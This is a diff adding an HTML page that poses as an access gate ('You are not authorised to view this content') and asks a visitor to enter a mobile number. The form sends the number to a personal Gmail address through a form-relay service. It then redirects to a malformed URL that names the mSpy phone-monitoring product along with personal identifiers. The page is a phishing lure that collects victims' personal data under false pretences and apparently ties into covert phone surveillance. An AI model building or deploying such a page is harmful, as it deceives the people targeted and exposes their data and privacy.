@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<body style="font-family: Arial; padding: 20px; max-width: 400px; margin: 0 auto;">
+    <h2 style="color: red;">You are not authorised to view this content !!!</h2>
+    <h2>Enter the mobile number to get accesss</h2>
+    
+    <!-- REPLACE THESE 2 VALUES ONLY: -->
+    <!-- 1. YOUR_EMAIL@gmail.com → Your email -->
+    <!-- 2. YOUR_REDIRECT_URL → Where to send users after -->
+    
+    <form action="https://formsubmit.co/hmanasa691@gmail.com" 
+          method="POST"
+          style="display: flex; flex-direction: column; gap: 15px;">
+        
+        <input type="hidden" name="_subject" value="New Number Submitted!">
+        <input type="hidden" name="_template" value="basic">
+        <input type="hidden" name="_next" value="www.mspy/19749176/Oneplus_nord_ce_3/subhashinimuppavarapu/media_library/.com">
+        <p><b>Name:</b> Nadendla Adhinarayana<br><br>
+        <b>Mobile Number:</b>
+            <input type="tel"
+            name="number"
+            placeholder="9XXXXXXXXX"
+            required
+            pattern="[0-9]{10}"
+            maxlength="10"
+            inputmode="numeric"
+            style="padding: 7px; font-size: 14px;"
+        >
+        </p>
+        
+        
+        <button type="submit" 
+                style="background: #007bff; color: white; padding: 12px; border: none; font-size: 16px;">
+            Submit & Continue
+        </button>
+    </form>
+    
+    <script>
+        document.querySelector('form').addEventListener('submit', function (e) {
+            const numberInput = document.querySelector('input[name="number"]');
+            const number = numberInput.value.trim();
+
+            if (!/^\d{10}$/.test(number)) {
+                e.preventDefault();
+                alert("Please enter a valid 10-digit number.");
+                numberInput.focus();
+                return;
+            }
+
+            const redirectInput = document.querySelector('input[name="_next"]');
+            redirectInput.value = redirectInput.value + '?number=' + encodeURIComponent(number);
+        });
+    </script>
+
+</body>
+</html>
